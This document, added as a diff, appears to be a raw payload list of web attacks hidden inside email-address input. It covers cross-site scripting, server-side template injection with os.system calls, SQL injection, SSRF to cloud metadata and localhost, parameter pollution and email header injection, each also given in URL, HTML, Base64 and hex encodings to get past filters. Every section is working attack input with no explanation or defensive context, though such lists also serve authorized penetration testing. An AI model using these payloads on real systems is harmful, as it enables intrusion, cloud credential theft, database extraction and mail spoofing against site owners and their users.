@@ -1,0 +1,188 @@
+✅ 1. XSS with Email Format:
+<script>alert(1)</script>@gmail.com
+"><script>alert(1)</script>@gmail.com
+"><img src=x onerror=alert(1)>@gmail.com
+"><svg/onload=alert(1)>@gmail.com
+"><iframe src=javascript:alert(1)>@gmail.com
+<video><source onerror="alert(1)">@gmail.com
+"><body onload=alert(1)>@gmail.com
+"><script>alert(document.domain)</script>@gmail.com
+"><img src="x" onerror="confirm(1)">@gmail.com
+"><svg onload=confirm(1)>@gmail.com
+"><input onfocus=alert(1) autofocus>@gmail.com
+<svg><script>alert(1)</script>@gmail.com
+"><math href="javascript:alert(1)">CLICK</math>@gmail.com
+"><details open ontoggle=alert(1)>@gmail.com
+
+✅ 2. SSTI:
+{{7*7}}@gmail.com
+${7*7}@gmail.com
+#{7*7}@gmail.com
+{{config.items()}}@gmail.com
+{{self}}@gmail.com
+{{request.application}}@gmail.com
+{{request}}@gmail.com
+<%= 7 * 7 %>@gmail.com
+{{__import__('os').system('id')}}@gmail.com
+{{''.__class__.__mro__[1].__subclasses__()}}@gmail.com
+{% set x = cycler %}{{ x.__init__.__globals__.os.system('id') }}@gmail.com
+${{<%[%'"}}@gmail.com
+{{this.constructor.constructor('alert(1)')()}}@gmail.com
+{{''.class.base.subclasses()}}@gmail.com
+{{request['application']}}@gmail.com
+
+✅ 3. SQL Injection:
+' OR 1=1--@gmail.com
+' OR 'a'='a'--@gmail.com
+' UNION SELECT NULL--@gmail.com
+' OR sleep(5)--@gmail.com
+' AND 1=1--@gmail.com
+' OR 1=1 LIMIT 1--@gmail.com
+' ORDER BY 1--@gmail.com
+' AND ascii(substr((SELECT user()),1,1))>64--@gmail.com
+' OR 1 GROUP BY CONCAT(username,password)--@gmail.com
+' UNION SELECT version()--@gmail.com
+' UNION SELECT database()--@gmail.com
+' UNION SELECT user()--@gmail.com
+' OR '1'='1' /*@gmail.com
+admin'--@gmail.com
+test' OR '1'='1'--@gmail.com
+
+✅ 4. SSRF:
+http://127.0.0.1:80@gmail.com
+http://localhost:80@gmail.com
+http://0.0.0.0:80@gmail.com
+http://[::]:80@gmail.com
+http://169.254.169.254@gmail.com
+http://169.254.169.254/latest/meta-data@gmail.com
+http://192.168.0.1:80@gmail.com
+http://internal-service@gmail.com
+http://google.com@127.0.0.1@gmail.com
+http://127.0.0.1.nip.io@gmail.com
+http://localhost.localdomain@gmail.com
+http://0x7f000001@gmail.com
+http://2130706433@gmail.com
+http://example.com@169.254.169.254@gmail.com
+http://localhost#@evil.com@gmail.com
+
+✅ 5. Parameter Pollution with Email Format:
+email=test@gmail.com&email=evil@gmail.com
+email=admin@gmail.com&user=admin&email=hacker@gmail.com
+email[]=user1@gmail.com&email[]=evil@gmail.com
+email=test%40gmail.com&email=test2%40gmail.com
+email=test@gmail.com&debug=true
+email=attacker@gmail.com&role=admin&email=admin@gmail.com
+email=x@gmail.com&xss=<script>alert(1)</script>
+email=normal@gmail.com&email=evil@gmail.com
+email=admin@gmail.com&admin=true
+email[]=x@gmail.com&email[]=y@gmail.com
+email=test@gmail.com&token=123456&email=admin@gmail.com
+email=user@gmail.com&email%5B%5D=evil@gmail.com
+email=payload1@gmail.com&email=payload2@gmail.com
+email=foo@gmail.com&foo=bar&email=evil@gmail.com
+email=user@gmail.com&X-Original-Email=admin@gmail.com
+
+✅ 6. Email Header Injection:
+attacker%0aBCC:evil@gmail.com@gmail.com
+test%0d%0aCC:attacker@gmail.com@gmail.com
+foo%0AContent-Type: text/html%0A%0A<script>alert(1)</script>@gmail.com
+test%0ASet-Cookie:session=abc123@gmail.com
+victim%0aTo:attacker@gmail.com@gmail.com
+inject%0aX-Injected: 1@gmail.com
+email%0aSubject: Hacked@gmail.com
+john%0aFrom:attacker@gmail.com@gmail.com
+victim%0a%0d%0aBCC:evil@example.com@gmail.com
+name%0aX-Test: malicious@gmail.com
+user%0aReply-To:evil@gmail.com@gmail.com
+payload%0aList-Unsubscribe:mailto:attacker@gmail.com@gmail.com
+test%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>@gmail.com
+test%0d%0aX-Email:evil@gmail.com@gmail.com
+malicious%0aFrom:evil@example.com@gmail.com
+
+
+XSS:
+%3Cscript%3Ealert(1)%3C%2Fscript%3E@gmail.com
+&lt;script&gt;alert(1)&lt;/script&gt;@gmail.com
+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==@gmail.com
+3c7363726970743e616c6572742831293c2f7363726970743e@gmail.com
+
+SSTI:
+%7B%7B7*7%7D%7D@gmail.com
+&#123;&#123;7*7&#125;&#125;@gmail.com
+e3s3KjN9fQ==@gmail.com
+7b7b372a377d7d@gmail.com
+
+SQLI:
+%27%20OR%201%3D1--@gmail.com
+&#39; OR 1=1--@gmail.com
+JyBPUiAxPTEtLQ==@gmail.com
+27204f5220313d312d2d@gmail.com
+
+SSRF:
+687474703a2f2f3136392e3235342e3136392e3235342f6c61746573742f6d6574612d64617461@gmail.com
+aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRh@gmail.com
+http://169.254.169.254/latest/meta-data@gmail.com
+http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data@gmail.com
+
+Parameter Pollution:
+email%3Dtest%40gmail.com%26email%3Devil%40gmail.com
+email=test&#64;gmail.com&amp;email=evil&#64;gmail.com
+ZW1haWw9dGVzdEBnbWFpbC5jb20mZW1haWw9ZXZpbEBnbWFpbC5jb20=
+656d61696c3d7465737440676d61696c2e636f6d26656d61696c3d6576696c40676d61696c2e636f6d
+
+Email Header Injection:
+61747461636b65722530614243433a6576696c40676d61696c2e636f6d@gmail.com
+YXR0YWNrZXIlMGFCQ0M6ZXZpbEBnbWFpbC5jb20=@gmail.com
+attacker%0aBCC:evil&#64;gmail.com@gmail.com
+attacker%250aBCC%3Aevil%40gmail.com@gmail.com
+
+
+✅ 1. XSS Encoded Payloads:
+Type	Payload
+URL	%3Cscript%3Ealert(1)%3C%2Fscript%3E@gmail.com
+URL	%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E@gmail.com
+HTML	&lt;svg onload=alert(1)&gt;@gmail.com
+Base64	PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==@gmail.com
+Hex	3c696672616d65207372633d6a6176617363726970743a616c6572742831293e@gmail.com
+
+✅ 2. SSTI Encoded Payloads
+Type	Payload
+URL	%7B%7B7*7%7D%7D@gmail.com
+URL	%7B%7Bconfig.items()%7D%7D@gmail.com
+HTML	&#123;&#123;self&#125;&#125;@gmail.com
+Base64	e3tzZWxmfX0=@gmail.com
+Hex	7b7b73656c667d7d@gmail.com
+
+✅ 3. SQLi Encoded Payloads
+Type	Payload
+URL	%27%20OR%201%3D1--@gmail.com
+URL	%27%20UNION%20SELECT%20NULL--@gmail.com
+HTML	&#39; OR sleep(5)--@gmail.com
+Base64	JyBPUiBzbGVlcCg1KS0t@gmail.com
+Hex	2720554e494f4e2053454c4543542056455253494f4e28292d2d@gmail.com
+
+✅ 4. SSRF Encoded Payloads
+Type	Payload
+URL	http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data@gmail.com
+URL	http%3A%2F%2Flocalhost%2Fadmin@gmail.com
+Base64	aHR0cDovL2xvY2FsaG9zdC9hZG1pbg==@gmail.com
+Hex	687474703a2f2f6c6f63616c686f73742f61646d696e@gmail.com
+HTML	http://169.254.169.254&#47;latest&#47;meta-data@gmail.com
+
+✅ 5. Parameter Pollution Encoded Payloads
+Type	Payload
+URL	email%3Dtest%40gmail.com%26email%3Devil%40gmail.com
+URL	email%3Dadmin%40gmail.com%26role%3Dadmin%26email%3Duser%40gmail.com
+HTML	email=test&#64;gmail.com&amp;email=evil&#64;gmail.com
+Base64	ZW1haWw9YWRtaW5AZ21haWwuY29tJmVtYWlsPXVzZXJAZ21haWwuY29t
+Hex	656d61696c3d7465737440676d61696c2e636f6d26656d61696c3d6576696c40676d61696c2e636f6d
+
+✅ 6. Email Header Injection Encoded Payloads
+Type	Payload
+URL	attacker%250aBCC%3Aevil%40gmail.com@gmail.com
+URL	test%0d%0aCC%3Aadmin%40gmail.com@gmail.com
+HTML	test%0aTo:attacker&#64;gmail.com@gmail.com
+Base64	dGVzdCUwYSBCQ0M6ZXZpbEBnbWFpbC5jb20=@gmail.com
+Hex	61747461636b65722530614243433a6576696c40676d61696c2e636f6d@gmail.com
+
+
